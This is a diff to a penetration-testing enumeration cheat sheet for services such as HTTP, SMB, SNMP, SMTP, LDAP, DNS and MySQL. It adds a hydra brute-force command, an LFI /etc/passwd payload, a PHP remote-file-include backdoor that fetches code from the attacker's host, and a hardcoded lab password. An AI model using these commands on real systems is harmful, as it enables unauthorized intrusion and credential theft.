@@ -134,10 +134,6 @@ upgrade searchsploit
 
 ```
 searchsploit -u
-```
-search for exploits 
-
-```
 searchsploit <service>
 
 google site:exploitdb <service version>
@@ -151,6 +147,7 @@ nikto -h IP
 curl -i http(s)://IP/robots.txt
 wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/common.txt --hc 404,403 -u "http://<IP>/FUZZ.txt" -t 100
 wfuzz -c -z range, 1-65535 http://10.10.10.55:60000/url.php?path=http://localhost:FUZZ
+hydra -l admin -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.18 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid" -V
 ```
 
 - fire up dirbuster with a medium wordlist
@@ -168,54 +165,72 @@ wfuzz -c -z range, 1-65535 http://10.10.10.55:60000/url.php?path=http://localhos
 - ?page=php://filter/convert.base64-encode/resource=../config.php
 
 - ../../../../../boot.ini for version
+- http://target.com/?page=./../../../../../../../../../etc/passwd%00
 
 - RFI backdoor
 
-```
-- <?php include $_GET['inc']; ?>
-```
 - access backdoor with http://IP/inc.php?inc=http://YOURIP/bd.php
 
 - phpinfo()
 
+- password bruteforce
+
+```
+- <?php include $_GET['inc']; ?>
+```
+
+
+
 ### 2. HTTPS 443
 
+```
+sslscan https://192.168.1.10/
+```
 - check out potential usernames in the ssl cert and the correct vhost
 - look for heartbleed vuln
 
-### 3. FTP 21
-
-- anonymous login
+### 3. FTP 21 TFTP UDP 69
 
 ```
 ftp IP
 anonymous:anonymous
+nmap --script=ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-anon,ftp-libopie,,ftp-vuln-cve2010-4221,tftp-enum -p 21 -n -v -sV -Pn IP
+
 ```
+- anonymous login
 - vulns in version
 - traverse filesystem look for password files, system configs, BOF targets, OS version
 - check upload potential
 
-### 4. SMB 139,445
 
--check if exploitable by msf
+
+### 4. SMB 139,445
 
 ```
 enum4linux -a IP
 smbclient -L IP
 locate *.nse | grep smb
-nmap -p 139,445 --script=$scriptname $targetip
-nmap -p 139,445 --script=smb-vuln* $targetip -v
+nmap -p 139,445 --script=$scriptname IP
+nmap -p 139,445 --script=smb-vuln* IP -v
 enum4linux -a $targetip
 enum4linux -a $targetip
 smbmap -H $targetip
-smbclient \\\\10.10.10.3\\tmp
+smbclient \\\\IP\\tmp
 rpcclient -U "" -N 10.10.10.3
 mount -t cifs -o user=USERNAME,sec=ntlm,dir_mode=0077 "//IP/My Share" /mnt/cifs
-smbmap -H 10.10.10.97 -u tyler -p '92g!mA8BGjOirkL%OG*&'
-nbtscan -r 10.10.10.0/24
-sudo nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln* 10.10.10.4
+smbmap -H IP -u tyler -p '92g!mA8BGjOirkL%OG*&'
+nbtscan -r IP/24
+sudo nmap -n -v -sV -Pn -p 445 --script=smb-ls,smb-mbenum,smb-enum-shares,smb-enum-users,smb-os-discovery,smb-security-mode,smb-vuln* IP
 psexec to login to samba
+smbclient -L 192.168.1.10
+smbclient \\IP\ipc$ -U administrator
+smbclient //IP/ipc$ -U administrator
+smbclient //IP/admin$ -U administrator
+
 ```
+-check if exploitable by msf
+
+
 ### 4. SNMP UDP 161
 
 ```
@@ -225,17 +240,70 @@ echo private >> community
 echo manager >> community
 for ip in $(seq 1 254);do echo 10.11.1.$ip;done > ips
 onesixtyone -c community -i ips
-snmpwalk -c public -v1 10.10.10.10
-snmpwalk -c public -v1 10.11.1.204 1.3.6.1.4.1.77.1.2.25
-snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.4.2.1.2
-snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.6.13.1.3
-snmpwalk -c public -v1 10.11.1.204 1.3.6.1.2.1.25.6.3.1.2
+snmpwalk -c public -v1 IP
+snmpwalk -c public -v1 IP 1.3.6.1.4.1.77.1.2.25
+snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.4.2.1.2
+snmpwalk -c public -v1 IP 1.3.6.1.2.1.6.13.1.3
+snmpwalk -c public -v1 IP 1.3.6.1.2.1.25.6.3.1.2
+```
+
+### 5. SSH 22
+
+-usually a secondary access point
+
+### 6. SMTP/Email 25, 110/995 or 143/993
+
+```
+nmap --script=smtp-enum-users,smtp-commands,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764,smtp-vuln-cve2010-4344 -p 25 -n -v -sV -Pn IP
+
+telnet IP 110
+USER user
+PASS pass
+
+LIST
+RETR message number
+QUIT
+```
+- useful for enumerating users
+- check versions and use searchsploit
+
+
+
+### 7. LDAP 389
+
+```
+ldapsearch -x -h IP -p389 -s base namingcontexts
+nmap -p 389 --script ldap-search IP
+```
+
+### 8. DNS 53
+
+modify /etc/hosts file for individual dns resolution
+modify /etc/resolv.conf for nameserver resolution overall
+```
+nslookup
+SERVER <ip>
+<ip>
+
+dig axfr subdomain @IP
 ```
 
 
+### 9. RPC 135
+
+-metasploit exploit for ms-rpc: exploit/windows/dcerpc/ms05_017_msmq
+```
+nmap -n -v -sV -Pn -p 135 --script=msrpc-enum IP 
+```
 
 
+### 10. MySQL 3306
 
+```
+nmap -n -v -sV -Pn -p 3306 --script=mysql-info,mysql-audit,mysql-enum,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-users,mysql-query,mysql-variables,mysql-vuln-cve2012-2122 IP
+
+mysql --host=IP -u root -p
+```
 
 
 
